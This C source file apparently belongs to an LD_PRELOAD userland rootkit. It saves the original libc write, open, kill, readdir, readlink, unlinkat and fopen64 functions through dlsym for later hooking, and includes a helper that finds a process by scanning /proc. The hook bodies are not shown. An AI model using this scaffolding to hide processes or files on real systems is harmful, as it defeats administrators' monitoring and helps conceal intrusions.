#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdbool.h>
#include <dirent.h>
#include <string.h>

#include "syscalls.c"
#include "log.c"

struct proc {
  int pid;
  bool alive;
};

void *find_addr(char *symbol){
	void *address = dlsym(RTLD_NEXT, symbol);
	if (address == NULL){
    debug("cant find address");
    exit(0);
  }
	return address;
}

void get_originals(){
  owrite = (ssize_t (*)(int, const void*, size_t))find_addr("write");
  oopen = (int (*)(const char* restrict, int, ...))find_addr("open");
  okill = (int (*)(pid_t, int))find_addr("kill");

  oreaddir = (struct dirent* (*)(DIR *))find_addr("readdir");
  oreadlink = (ssize_t (*)(const char *restrict, char *restrict, size_t))find_addr("readlink");
  
  ounlinkat = (int (*)(int, const char*, int))find_addr("unlinkat");  
  ofopen = (FILE* (*)(const char *restrict, const char *restrict mode))find_addr("fopen64");
}

char * replace(char * string, char x, char y, int len){
  for(int i = 0; i< len; i++){
    if(string[i]==x){
      string[i] = y;
    }
  }
  return string;
}

struct proc find_proc(const char* name) {
  DIR* dir;
  struct dirent* entry;
  struct proc ret;
  ret.pid = 0;
  ret.alive = false;
 
  dir = opendir("/proc");
  if (dir == NULL){
    return ret;
  }

  while ((entry = readdir(dir)) != NULL) {

    if (entry->d_type != DT_DIR) {
      continue;
    }

    char pidp[256];
    sprintf(pidp, "/proc/%s/cmdline", entry->d_name);
    FILE* cmdline = fopen(pidp, "r");
    
    if (!cmdline){
      continue;
    }

    char buffer[256];
    size_t len = fread(buffer, 1, sizeof(buffer) - 1, cmdline);
    fclose(cmdline);
    char* cmd = replace(buffer, '\0', ' ', len);

    if(strstr(cmd, name)==NULL){
      continue;
    }

    closedir(dir);
    ret.pid = atoi(entry->d_name);
    ret.alive = true;
    return ret;	
  }

  closedir(dir);
  return ret;
}

